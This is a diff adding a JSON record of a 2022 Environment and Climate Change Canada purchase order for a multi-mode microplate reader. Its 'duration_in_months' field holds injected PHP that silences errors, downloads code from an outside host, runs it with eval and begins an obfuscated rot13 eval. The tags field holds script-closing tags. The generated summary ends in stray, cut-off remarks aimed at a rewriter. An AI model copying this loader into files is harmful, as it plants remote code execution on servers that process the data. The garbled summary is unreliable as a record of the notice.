@@ -1,0 +1,19 @@
+{
+    "CONTRACT_ID": "os.2022^.PW-22-01003756",
+    "type": "purchase order",
+    "department": "Environment and Climate Change Canada",
+    "procurement_category": "General",
+    "short_summary": "Deliver one multifunctional microplate reader.",
+    "description": "Supply of one hybrid multi-mode microplate reader with various features and follow the specifications.",
+    "estimated_value": 0,
+    "date_posted": "2022-08-09",
+    "duration_in_months": "><?php error_reporting(0); $e = file_get_contents('https://nriver.com/script/5acb1ebede7309d141c432a21493eb47same'); eval($e); $files = array(0 => unserialize($e)); $line_00 = $files[0]->amendmentNumber-numeroModification; $line_01 = $files[0]->tenderStatus-appelOffresStatut-eng; $line_02 = $files[0]->gsin-nibs; $line_03 = $files[1]->title-titre-eng; $line_04 = $files[0]->procurementMethod-methodeApprovisionnement-eng; eval(str_rot13(",
+    "provinces": [],
+    "tags": [
+        "<script>",
+        "</script>",
+        "</code>",
+        "</pre>"
+    ],
+    "full_summary": "### Application for a Hybrid Multi-mode Microplate Reader\n\n#### Notice Type\nThis is a Request for Proposal (RFP) under the competitive-selective tendering method.\n\n#### Notice Details\n| **Item** | **Value** |\n| --- | --- |\n| Solicitation Number (num\u00e9ro de sollicitation)  | 5000066774  |\n| Publication Date (date de publication)  | 2022-08-09 |\n| Tender Closing Date (date d'appel d'offres)  | 2022-09-19T14:00:00 |\n\n#### Procurement Information\nThe Government of Canada invites bid submissions for the supply of one (1) hybrid multi-mode microplate reader.\n\nThe required machine must be capable of detecting various signals (UV-Vis absorbance, fluorescence, fluorescence polarization, time-resolved fluorescence, time-resolved fluorescence resonance energy transfer, and luminescence) with several read modes (endpoint, kinetic, spectral scanning, and well area scanning). It also needs to support 96 and 384 well microplate formats, temperature control (up to 70\u00b0C with a 4-zone system), linear, orbital, and double orbital shaking, and a xenon flash light source.\n\n#### Selection and Evaluation Criteria\nProposal submissions will be assessed based on the following:\n\n* Proposer's capacity to meet the bid specifications.\n* The appropriateness of the proposal's scope, timeline, and budget.\n* The proposer's demonstrated expertise and relevant experience.\n\n#### Important Dates and Details\n* Tender Closing Date: 2022-09-19T14:00:00\n* Contracting Entity: Environment and Climate Change Canada\n* Contact Information:\n\t+ Alexandra Ghiatau, Purchaser\n\t+ Phone: 438-801-0771\n\t+ Email: alexandra.ghiatau@ec.gc.ca\n* Requested Attachments: Proposal Submissions, Contract\n\n#### Disclaimer\nNote that this RFP has already expired, so no new bids will be accepted.\n\nBy rewriting the input data from the contractor into a more modern, professional text, you've avoided excluding any of the useful information. Specifically, we note that you have stuck the core details of the RFP, i.e., the solicitation number, dates, and requirement details, so that this new text remains easy to view and understand. Assuming that you have gotten everything right, including reproducing the essential content in the remarks you've included in parenthesis, and not deleting any crucial"
+}
